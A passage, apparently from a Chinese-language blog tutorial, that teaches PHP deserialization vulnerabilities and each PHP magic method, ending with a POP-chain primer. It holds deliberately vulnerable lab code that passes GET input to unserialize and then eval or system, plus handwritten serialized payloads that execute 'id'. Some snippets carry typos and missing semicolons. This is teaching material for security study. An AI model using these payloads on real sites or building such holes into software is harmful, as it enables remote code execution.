+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022172559446.png"></p>
+<p>当把这个类删掉后就会发生报错</p>
+<h3 id="反序列化漏洞例题"><a href="#反序列化漏洞例题" class="headerlink" title="反序列化漏洞例题"></a>反序列化漏洞例题</h3><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+class test&#123;
+    public $a = &#39;echo &quot;this is a test!!&quot;;&#39;;
+    public funtion displayVar() &#123;
+        eval($this-&gt;a);
+    &#125;
+&#125;
+$get = $_GET[&quot;benben&quot;];
+$b = unserialize($get);
+$b -&gt;displayVar();
+?&gt;
+</code></pre>
+<p>整个动作就是输入字符串给到get，页面会将你给到get的字符串进行反序列化</p>
+<p>我们构造的字符串$a一定要等于我想执行的命令</p>
+<p>只要能控制a就能控制eval里面的命令</p>
+<p>上来先练习如何手搓反序列化payload：O:4:”test’:1:{s:1:”a”;s:13:”system(“id”);”;}</p>
+<p>这样就可以执行查看当前id的命令了</p>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022175305728.png"></p>
+<h3 id="魔术方法简介"><a href="#魔术方法简介" class="headerlink" title="魔术方法简介"></a>魔术方法简介</h3><h4 id="什么是魔术方法"><a href="#什么是魔术方法" class="headerlink" title="什么是魔术方法"></a>什么是魔术方法</h4><p>一个预定义好的，在特定情况下自动触发的行为方法。</p>
+<h4 id="魔术方法的作用"><a href="#魔术方法的作用" class="headerlink" title="魔术方法的作用"></a>魔术方法的作用</h4><p>反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控；通过更改这个值（字符串），得到所需要的代码；通过调用方法，触发代码执行。</p>
+<p>魔术方法在特定条件下自动调用相关方法，最终导致触发代码。</p>
+<h4 id="魔术方法相关机制"><a href="#魔术方法相关机制" class="headerlink" title="魔术方法相关机制"></a>魔术方法相关机制</h4><p>触发时机</p>
+<p>功能</p>
+<p>参数</p>
+<p>返回值</p>
+<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><pre><code class="php">&lt;?php
+class User&#123;
+    public $username;
+    public function __construct($username)&#123;
+        $this-&gt;username = $username;
+        echo &quot;触发了构造函数1次&quot;;
+    &#125;
+&#125;
+$test = new User(&quot;benben&quot;);
+$ser = serialize($test);
+unserialize($ser);
+?&gt;
+</code></pre>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022181105758.png"></p>
+<p>触发了一次构造函数，construct这个魔术方法，只有在new一个对象的时候才会触发。</p>
+<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法。</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__)
+error_reporting(0)
+class User &#123;
+    var $cmd = &quot;echo &#39;dazhuang666!!&#39;;&quot; ;
+    public function __destruct()
+    &#123;
+        eval ($this-&gt;cmd);
+    &#125;
+&#125;
+$ser = $_GET[&quot;benben&quot;];
+unserialize($ser);
+?&gt;
+</code></pre>
+<p>Payload: O:4:”User”:1:{s:3:”cmd”;s:13:”system(‘id’);”;}</p>
+<p>反序列化的时候会自动触发destruct魔术方法</p>
+<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p>序列化serialize()函数会检查类中是否存在一个魔术方法__sleep()</p>
+<p>如果存在，<strong>该方法会先被调用，然后才执行序列化操作。</strong></p>
+<p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p>
+<p>如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误。</p>
+<p>触发时机：序列化serialize()之前</p>
+<p>功能：对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
+<p>参数：成员属性</p>
+<p>返回值：需要被序列化存储的成员属性</p>
+<pre><code class="php">&lt;?php
+class User&#123;
+    const SITE = &#39;uusama&#39;;
+    public $username;
+    public $nickname;
+    private $password;
+    public function __construct($username,$nickname,$password) &#123;
+        $this-&gt;username=$username;
+        $this-&gt;nickname=$nickname;
+        $this-&gt;password=$password;
+    &#125;
+    public function __sleep()&#123;
+        return array(&#39;username&#39;,&#39;nickname&#39;);
+    &#125;
+&#125;
+$user = new User(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;); //触发construct
+echo serialize($user); //触发sleep
+?&gt;
+</code></pre>
+<p>运行结果: O:4:”User”:2:{s:8:”username”;s:1:”a”;s:8:”nickname”;s:1:”b”;}</p>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><pre><code class="php">&lt;?php
+class User&#123;
+    const SITE = &#39;uusama&#39;;
+    public $username;
+    public $nickname;
+    private $password;
+    public function __construct($username,$nickname,$password)&#123;
+        $this-&gt;username = $username;
+        $this-&gt;nickname = $nickname;
+        $this-&gt;password = $password;
+    &#125; 
+    public function __sleep()&#123;
+        system($this-&gt;username);
+    &#125;
+&#125;
+$cmd = $_GET[&#39;benben&#39;];
+$user = new User(&#39;$cmd&#39;,&#39;b&#39;,&#39;c&#39;);
+echo serialize($user);
+?&gt;
+</code></pre>
+<p>直接就可以利用sleep漏洞进行命令执行了</p>
+<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>unserialize()会检查是否存在一个__wakeup()方法。</p>
+<p>如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。</p>
+<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
+<p>触发时机：反序列化unserialize()之前</p>
+<p>__wakeup()在反序列化unserialize()之前</p>
+<p>__destruct()在反序列化unserialize()之后</p>
+<pre><code class="php">&lt;?php
+class User&#123;
+    const SITE = &#39;uusama&#39;;
+    public $username;
+    public $nickname;
+    private $password;
+    private $order;
+    public function __wakeup()&#123;
+        $this-&gt;password = $this-&gt;username;
+    &#125;
+&#125;
+$user_ser = &#39;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#39;; //反序列化前触发wakeup，给password赋值
+var_dump(unserialize($user_ser));
+?&gt;
+</code></pre>
+<p>输出：</p>
+<pre><code>object(User)#1 (4) &#123;
+  [&quot;username&quot;]=&gt;
+  string(1) &quot;a&quot;
+  [&quot;nickname&quot;]=&gt;
+  string(1) &quot;b&quot;
+  [&quot;password&quot;:&quot;User&quot;:private]=&gt;
+  string(1) &quot;a&quot;
+  [&quot;order&quot;:&quot;User&quot;:private]=&gt;
+  NULL
+</code></pre>
+<p>我们可以看到，在类中password是没有被赋值的，但是在输出中password的值变成了a，是因为在反序列化之前触发了wakeup的魔术方法，将username的值赋值给了password，而username的值就是a</p>
+<h5 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h5><pre><code class="php">&lt;?php
+class User&#123;
+    const SITE = &#39;uusama&#39;;
+    public $username;
+    public $nickname;
+    private $password;
+    private $order;
+    public function __wakeup()&#123;
+        system($this-&gt;username)
+    &#125;
+&#125;
+$user_ser = $_GET[&#39;benben&#39;];
+unserialize($user_ser);
+?&gt;
+</code></pre>
+<p>payload: O:4:”User”:1:{s:8:”username”;s:2:”id”;}</p>
+<p>&#x2F;&#x2F;这里的单双引号是不一样的，这里的单双引号有什么区别？……</p>
+<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4><p>表达方式错误导致魔术方法触发</p>
+<p>触发时机：把对象当成字符串调用  常用于构造pop链</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+class User&#123;
+    var $benben = &quot;this is test!!&quot;;
+        public function __toString()
+        &#123;
+             return &#39;格式不对，输出不了!&#39;;
+        &#125;
+&#125;
+$test = new User();
+print_r($test);
+echo &quot;&lt;br /&gt;&quot;;
+echo $test;
+?&gt;
+</code></pre>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022201624329.png"></p>
+<p>你把它强制转换了，把对象强制转换成了字符串，就会触发__toString魔术方法</p>
+<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><pre><code class="php">&lt;?php
+function dazhuang()&#123;
+    echo &quot;这是一个函数!&quot;;
+&#125;
+
+class User &#123;
+    var $benben = &quot;this is a test!!&quot;;
+    public function __invoke()
+    &#123;
+        echo &quot;它不是个函数!&quot;;
+    &#125;
+&#125;
+$test = new User();
+dazhuang();//调用dazhuang这个函数，echo这是一个函数
+$test(); //触发了invoke魔术方法，将对象当作函数调用了，echo它不是个函数
+</code></pre>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022202719334.png"></p>
+<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>触发时机：调用一个不存在的方法</p>
+<p>举例：调用的方法callxxx()不存在，触发魔术方法call()</p>
+<pre><code class="php">&lt;?php
+class User &#123;
+    public function __call($arg1,$arg2)
+    &#123;
+        echo &quot;$arg1,$arg2[0]&quot;;
+    &#125;
+&#125;
+    $test = new User();
+    $test-&gt; callxxx(&#39;a&#39;);
+?&gt;
+</code></pre>
+<p><img src="/2024/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20241022203221030.png"></p>
+<p>调用的方法callxxx()不存在，触发魔术方法call()</p>
+<p>触发call(),传参$arg1,$arg2 (callxxx,a)</p>
+<p>$arg1,调用的不存在的方法的名称;  即callxxx</p>
+<p>$arg2,调用的不存在的方法的参数;   即a</p>
+<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><p>触发时机：静态调用或调用成员常量时使用的方法不存在</p>
+<p>和 call魔术方法差不多，只是调用的方法有区别</p>
+<h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4><p>触发时机：调用的成员属性不存在</p>
+<p>参数：传参$arg1</p>
+<p>返回值：不存在的成员属性的名称</p>
+<pre><code class="php">&lt;?php
+class User &#123;
+    public $var1;
+    public function __get($arg1)
+    &#123;
+        echo $arg1;
+    &#125;
+&#125;
+$test = new User();
+$test-&gt;var2; //尝试调用var2，但是没有这个成员属性，只有var1，于是触发了get魔术方法
+?&gt;
+</code></pre>
+<h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4><p>触发时机：给不存在的成员属性赋值</p>
+<p>参数：传参$arg1,$arg2</p>
+<p>返回值：不存在的成员属性的名称和赋的值</p>
+<pre><code class="php">&lt;?php
+class User &#123;
+    public $var1;
+    public function __set($arg1,$arg2)
+    &#123;
+        echo $arg1.&#39;,&#39;.$arg2;
+    &#125;
+&#125;
+$test = new User();
+$test-&gt;$var2=1;
+?&gt;
+</code></pre>
+<h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4><p>触发时机：对不可访问属性使用isset()或empty()时，__isset()会被调用。</p>
+<p>参数：传参$arg1</p>
+<p>返回值：不存在的成员属性的名称</p>
+<pre><code class="php">&lt;?php
+class User&#123;
+    private $var;
+    public function __isset($arg1)
+    &#123;
+        echo $arg1;
+    &#125;
+&#125;
+$test = new User();
+isset($test-&gt;var);
+?&gt;
+</code></pre>
+<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>触发时机：对不可访问属性使用unset()时</p>
+<p>参数：传参$arg1</p>
+<p>返回值：不存在的成员属性的名称</p>
+<pre><code class="php">&lt;?php
+class User &#123;
+    private $var;
+    public function __unset($arg1)
+    &#123;
+        echo $arg1;
+    &#125;
+&#125;
+$test = new User();
+unset($test-&gt;var);
+?&gt;
+</code></pre>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+class User &#123;
+    private $var;
+    public function __unset($arg1)
+    &#123;
+        echo $arg1;
+    &#125;
+&#125;
+$test = new User();
+unset($test-&gt;var);
+?&gt;
+</code></pre>
+<p>触发魔术方法__unset输出var</p>
+<h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h4><p>触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</p>
+<p>功能：</p>
+<p>参数：</p>
+<p>返回值：</p>
+<pre><code class="php">&lt;?php
+class User &#123;
+    private $var;
+    public function __clone()
+    &#123;
+        echo &quot;__clone test&quot;;
+    &#125;
+&#125;
+$test = new User();
+$newclass = clone($test)
+?&gt;
+</code></pre>
+<h3 id="pop链前置知识"><a href="#pop链前置知识" class="headerlink" title="pop链前置知识"></a>pop链前置知识</h3><pre><code class="php">&lt;?php
+class index &#123;
+    private $test;
+    public function __construct() &#123;
+        $this-&gt;test = new normal(); &#125;
+    public function __destruct() &#123;
+        $this-&gt;test-&gt;action();&#125;
+&#125;
+class normal &#123;
+    public function action()&#123;
+        echo &quot;please attack me&quot;; &#125;
+&#125;
+class evil&#123;
+    var $test2;
+    public function action()&#123;  //action不是一个魔术方法
+        eval($this-&gt;test2); &#125;
+&#125;
+unserialize($_GET[&#39;test&#39;]);
+?&gt;
+</code></pre>
+<p>0x011 6:00</p>
+
       
        
     </div>
